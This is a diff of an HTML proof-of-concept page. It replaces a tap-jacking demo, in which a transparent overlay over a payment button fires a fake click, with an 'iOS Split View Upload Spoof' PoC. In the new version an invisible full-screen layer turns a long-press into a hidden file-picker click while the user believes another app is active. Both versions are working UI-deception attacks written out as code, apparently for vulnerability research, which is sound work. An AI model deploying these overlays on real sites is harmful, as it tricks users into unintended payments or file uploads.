@@ -1,94 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tap Jacking to Activate Payment Method</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-        }
+<meta charset="UTF-8">
+<title>iOS Split View Upload Spoof PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        /* Hidden button placed above the actual payment method button */
-        #hiddenButton {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            background-color: rgba(255, 0, 0, 0.0); /* Transparent */
-            z-index: 9999; /* Ensure it is above everything else */
-        }
+<style>
+  body {
+    margin: 0;
+    font-family: system-ui, -apple-system;
+    background: #fff;
+  }
 
-        .payment-container {
-            position: relative;
-            text-align: center;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
+  .cover {
+    position: fixed;
+    inset: 0;
+    z-index: 10;
+  }
 
-        .method-selector {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            margin-top: 20px;
-            cursor: pointer;
-        }
+  .hint {
+    position: fixed;
+    bottom: 20px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    color: #444;
+    font-size: 14px;
+  }
 
-        .method-selector.selected {
-            background-color: #FFA500; /* Indicating a selection */
-        }
-    </style>
+  input {
+    display: none;
+  }
+
+  img {
+    width: 100%;
+  }
+</style>
 </head>
 <body>
 
-<!-- Invisible overlay for Tap Jacking -->
-<div id="hiddenButton"></div>
+<!-- Invisible interaction layer -->
+<div class="cover"></div>
 
-<!-- Payment method selection form -->
-<div class="payment-container">
-    <h2>Select Your Payment Method</h2>
-
-    <button id="paymentMethodButton" class="method-selector">Select Payment Method</button>
-    <p id="status">No method selected</p>
+<div class="hint">
+  Long‑press anywhere<br>
+  (User thinks Google Drive is active)
 </div>
 
+<input id="file" type="file" accept="image/*">
+<img id="preview">
+
 <script>
-    const log = (...args) => console.log("[PoC]", ...args);
+const file = document.getElementById("file");
+const preview = document.getElementById("preview");
 
-    // Mimic the action of selecting a payment method
-    const activatePaymentMethod = () => {
-        const statusElement = document.getElementById('status');
-        const paymentButton = document.getElementById('paymentMethodButton');
-        
-        paymentButton.classList.add('selected');
-        statusElement.textContent = "Payment method selected! You can now proceed.";
-        log("Payment method activated!");
-    };
+let pressTimer;
 
-    // Detect click on the hidden button (simulating tap jacking)
-    document.getElementById('hiddenButton').addEventListener('click', () => {
-        log('Tap detected! Activating payment method...');
-        activatePaymentMethod();
-    });
+document.querySelector(".cover").addEventListener("touchstart", () => {
+  pressTimer = setTimeout(() => {
+    file.click(); // triggers iOS photo/file picker
+  }, 700); // long‑press threshold
+});
 
-    // Simulate a tap after a short delay (e.g., 2 seconds) to simulate an attack
-    setTimeout(() => {
-        log('Simulating user tap on hidden button...');
-        document.getElementById('hiddenButton').click(); // Simulate a click on the hidden element
-    }, 2000); // Simulate after 2 seconds delay
+document.querySelector(".cover").addEventListener("touchend", () => {
+  clearTimeout(pressTimer);
+});
+
+file.onchange = () => {
+  if (file.files.length) {
+    preview.src = URL.createObjectURL(file.files[0]);
+  }
+};
 </script>
 
 </body>
